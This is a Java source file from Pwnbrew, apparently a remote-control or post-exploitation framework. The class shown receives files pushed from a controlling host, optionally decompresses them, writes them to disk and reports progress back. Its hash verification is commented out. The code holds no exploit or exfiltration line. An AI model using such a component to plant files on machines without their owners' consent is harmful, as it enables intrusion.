/*

Copyright (C) 2013-2014, Securifera, Inc 

All rights reserved. 

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation 
	and/or other materials provided with the distribution.

    * Neither the name of Securifera, Inc nor the names of its contributors may be 
	used to endorse or promote products derived from this software without specific
	prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER 
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

================================================================================

Pwnbrew is provided under the 3-clause BSD license above.

The copyright on this package is held by Securifera, Inc

*/


/*
 *  FileReceiver.java
 *
 *  Created on Jun 3, 2013
 */

package pwnbrew.network.file;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.logging.Level;
import java.util.zip.Inflater;
import java.util.zip.InflaterInputStream;
import pwnbrew.ClientConfig;
import pwnbrew.Persistence;
import pwnbrew.log.RemoteLog;
import pwnbrew.log.LoggableException;
import pwnbrew.manager.DataManager;
import pwnbrew.manager.OutgoingConnectionManager;
import pwnbrew.network.ClientPortRouter;
import pwnbrew.utilities.DebugPrinter;
import pwnbrew.network.control.messages.PushFile;
import pwnbrew.network.control.messages.PushFileFin;
import pwnbrew.network.control.messages.TaskProgress;
import pwnbrew.selector.SocketChannelHandler;

/**
 *
 *  
 */
final public class FileReceiver {
    
    //File related variables
    private File fileLoc = null;
    private long fileByteCounter = 0;
    private long fileSize = 0;
    
    private int sndFileProgress = 0;  
    private int srcHostId = 0;
    private int taskId = 0;
    private int fileId = 0;
    private int channelId = 0;
//    private String fileHash = null;
    private final boolean compressed;
    private ByteBuffer compBB;
    
    private FileOutputStream aFileStream = null;
//    private MessageDigest fileDigest = null;
    
    private final FileMessageManager theFileMessageManager;
    private static final String NAME_Class = FileReceiver.class.getSimpleName();
        
    //===========================================================================
    /**
     * 
     *  Constructor
     * 
     * @param passedManager
     * @param passedMsg
     * @param parentDir 
     * @throws pwnbrew.log.LoggableException 
     * @throws java.security.NoSuchAlgorithmException 
     * @throws java.io.IOException 
     */
    public FileReceiver( FileMessageManager passedManager, PushFile passedMsg, File parentDir ) 
            throws LoggableException, NoSuchAlgorithmException, IOException {
            
        theFileMessageManager = passedManager;
        taskId = passedMsg.getTaskId();
        fileId = passedMsg.getFileId();
        fileSize = passedMsg.getFileSize();
        srcHostId = passedMsg.getSrcHostId();
        channelId = passedMsg.getFileChannelId();
        compressed = passedMsg.useCompression();
                
         //Get file hash
        String hashFilenameStr = passedMsg.getHashFilenameString();

        //Set the hash
        String[] fileHashFileNameArr = hashFilenameStr.split(":", 2);
        if( fileHashFileNameArr.length != 2 )
            throw new LoggableException("Passed hash filename string is not correct.");
      
//        fileHash = fileHashFileNameArr[0];
      
        //Create the file digest
//        fileDigest = MessageDigest.getInstance(Constants.HASH_FUNCTION);
        
        //Ensure the parent directory exists
        Persistence.ensureDirectoryExists(parentDir);
        
        //create byte buffer
        if( compressed )
            compBB = ByteBuffer.allocate((int)fileSize + 256);

        String filePath = fileHashFileNameArr[1];
        String fileName = filePath.substring( filePath.lastIndexOf("\\") + 1 );
        fileLoc = new File( parentDir, fileName );
//        if(fileLoc.exists()){
//
//            //If file already exists and the hash is the same
//            String localFileHash = FileUtilities.getFileHash(fileLoc);
//            if( !localFileHash.equals(fileHash) && !fileLoc.delete()){
//                cleanupFileTransfer();
//                throw new LoggableException("File already exists, the hash does not match, and was unable to remove it.");
//            }
//
//        }

        //Open the file stream
        aFileStream = new FileOutputStream(fileLoc, true);
    }
    
    //===============================================================
    /**
    * Cleans up the file transfer
    @SuppressWarnings("ucd")
    *
    */
    public void cleanupFileTransfer(){

        try {

            //Close the file channell
            if(aFileStream != null){
               aFileStream.getFD().sync();
               aFileStream.flush();
            }

        } catch (IOException ex) {
            ex = null;
        } 

        //Close the file stream
        try {
            if(aFileStream != null){
                aFileStream.close();
            }
        } catch (IOException ex) {
            ex = null;
        }  
        
//        ClientConfig theConf = ClientConfig.getConfig();
//        int socketPort = theConf.getSocketPort();
//        ClientPortRouter aPR = (ClientPortRouter) theFileMessageManager.getPortManager().getPortRouter( socketPort );
//        
//        //Get the connection manager
//        OutgoingConnectionManager aOCM = aPR.getConnectionManager( srcHostId );
//        if( aOCM != null ){
//            SocketChannelHandler aSCH = aOCM.removeHandler( channelId );
//            if( aSCH != null )
//                aSCH.shutdown();            
//        }
    }
    
    //===========================================================================
    /**
     * 
     * @param passedSize 
     */
    public void updateFileSize( long passedSize ){
        fileSize = passedSize;
        receiveFile(new byte[0]);
    }
    
    //===============================================================
    /**
     * Receives the bytes from the socket channel and puts them into a file
     *
     @SuppressWarnings("ucd")
     * @param passedByteArray
    */

    public void receiveFile(byte[] passedByteArray){

        try {
            
            if( passedByteArray.length + fileByteCounter > fileSize ){
                int diff = (int) (fileSize - fileByteCounter);
                passedByteArray = Arrays.copyOf(passedByteArray, diff);
            }

            //Copy over the bytes
            //Copy over the bytes
            if( compressed ){
                compBB.put(passedByteArray);
            } else {
                aFileStream.write(passedByteArray);
            }
            fileByteCounter += passedByteArray.length;
//            fileDigest.update(passedByteArray);
//            DebugPrinter.printMessage(NAME_Class, "Receiving file, bytes: " + fileByteCounter);
            
            int tempProgressInt = 0;
            if(fileSize != 0){
                double tempProgressDouble = (1.0 * fileByteCounter) / (1.0 * fileSize );
                tempProgressInt = (int)Math.round(tempProgressDouble * 100.0);
            }

            if(tempProgressInt != sndFileProgress){
                
                //Send a progress update
                sndFileProgress = tempProgressInt;
               
                TaskProgress aProgMsg = new TaskProgress(taskId, sndFileProgress );
                aProgMsg.setDestHostId(srcHostId);
                DataManager.send( theFileMessageManager.getPortManager(), aProgMsg);

            }            
            
            //If the byte count has passed the file size than send a finished message
            //so the socket can be closed
            if(fileByteCounter >= fileSize){
                
                //Make sure to set the progress to 100
                if(sndFileProgress != 100 ){
                    sndFileProgress = 100;
                    TaskProgress aProgMsg = new TaskProgress(taskId, sndFileProgress );
                    aProgMsg.setDestHostId(srcHostId);
                    DataManager.send( theFileMessageManager.getPortManager(), aProgMsg);
                }
                
                //If compressed
                if( compressed ){
                    
                    //Convert bytebuffer to array
                    byte[] compFileByteArr = new byte[ compBB.position() ];
                    compBB.flip();
                    compBB.get( compFileByteArr, 0, compFileByteArr.length ); 
                    compBB.clear();
                    
                    //Make the array into a stream                   
                    ByteArrayInputStream bais = new ByteArrayInputStream( compFileByteArr );
                    Inflater inflater = new Inflater();
                    
                    try ( //Unzip and write to file
                        InflaterInputStream iis = new InflaterInputStream(bais, inflater)) {
                        byte[] buffer = new byte[32768];
                        int len;
                        while((len = iis.read(buffer)) > 0){
                            aFileStream.write(buffer, 0, len);
                        }
                    }
                    aFileStream.close();
                    
                }

                //Get the hash and reset it
//                byte[] byteHash = fileDigest.digest();
//                String hexString = Utilities.byteToHexString(byteHash);
//
//                if( !fileHash.equals("0") && !hexString.equals(fileHash)){
//                    RemoteLog.log(Level.WARNING, NAME_Class, "receiveFile()", "Calculated file hash does not match the hash provided.", null);
//                }

                DebugPrinter.printMessage( this.getClass().getSimpleName(), "Received File.");

                //Get the msg Id before clearing all values
                cleanupFileTransfer();

                  
                PushFileFin finMessage = new PushFileFin( channelId, taskId, fileId, "" );
                finMessage.setDestHostId(srcHostId);
                DataManager.send( theFileMessageManager.getPortManager(), finMessage);

                //Remove from the parent map
                theFileMessageManager.removeFileReceiver( fileId, channelId );
                
            }            
     
        } catch (IOException ex) {

             RemoteLog.log(Level.SEVERE, NAME_Class, "receiveFile()", ex.getMessage(), ex);

             //Clear all the file transfer variables
             cleanupFileTransfer();

        }

    }

    //===============================================================
    /**
     *  Returns the file id
     * 
     * @return 
     */
    public int getTaskId() {
        return taskId;
    }

    //===============================================================
    /**
     * 
     * @return 
     */
    public int getChannelId() {
        return channelId;
    }

}
